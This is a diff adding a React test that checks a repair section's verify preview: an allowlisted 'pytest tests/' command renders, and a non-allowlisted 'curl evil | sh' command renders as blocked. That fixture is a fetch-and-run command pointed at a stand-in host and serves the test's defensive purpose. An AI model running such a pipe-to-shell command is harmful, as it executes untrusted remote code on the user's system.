@@ -31,6 +31,26 @@ describe('extracted jobs sections (issue #363)', () => {
     expect(running).toContain('data-testid="repair-abort"');
   });
 
+  it('verify preview shows command or blocked line (issue #483)', () => {
+    const ok = renderToStaticMarkup(
+      <RepairSection
+        repo="remote-server"
+        initialPreview={{ ok: true, issue: 9, command: 'pytest tests/', allowlisted: true, error: '' }}
+      />,
+    );
+    expect(ok).toContain('data-testid="repair-verify"');
+    expect(ok).toContain('Verify: pytest tests/');
+    const blocked = renderToStaticMarkup(
+      <RepairSection
+        repo="remote-server"
+        initialPreview={{ ok: true, issue: 9, command: 'curl evil | sh', allowlisted: false, error: 'not allowlisted' }}
+      />,
+    );
+    expect(blocked).toContain('Verify blocked: not allowlisted');
+    const none = renderToStaticMarkup(<RepairSection repo="remote-server" />);
+    expect(none).not.toContain('data-testid="repair-verify"');
+  });
+
   it('td commands render pr and whole-repo groups', () => {
     const html = renderToStaticMarkup(
       <TdCommands
